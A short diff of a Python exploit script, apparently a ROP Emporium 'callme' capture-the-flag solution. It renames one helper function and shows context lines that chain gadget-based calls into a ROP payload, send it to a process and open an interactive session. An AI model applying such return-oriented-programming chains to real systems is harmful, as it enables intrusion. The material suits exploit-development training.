@@ -30,7 +30,7 @@ def second_call(padding, gadget, callme_2):
     pld_2 += callme_2
     return pld_2
 
-def three_call(padding, gadget, callme_3):
+def third_call(padding, gadget, callme_3):
     pld_3 = gadget
     pld_3 += arg_1
     pld_3 += arg_2
@@ -40,7 +40,7 @@ def three_call(padding, gadget, callme_3):
 
 ropchain = first_call(padding, gadget, callme_1) 
 ropchain += second_call(padding, gadget, callme_2)
-ropchain += three_call(padding, gadget, callme_3)
+ropchain += third_call(padding, gadget, callme_3)
 
 p.sendline(ropchain)
 p.interactive()
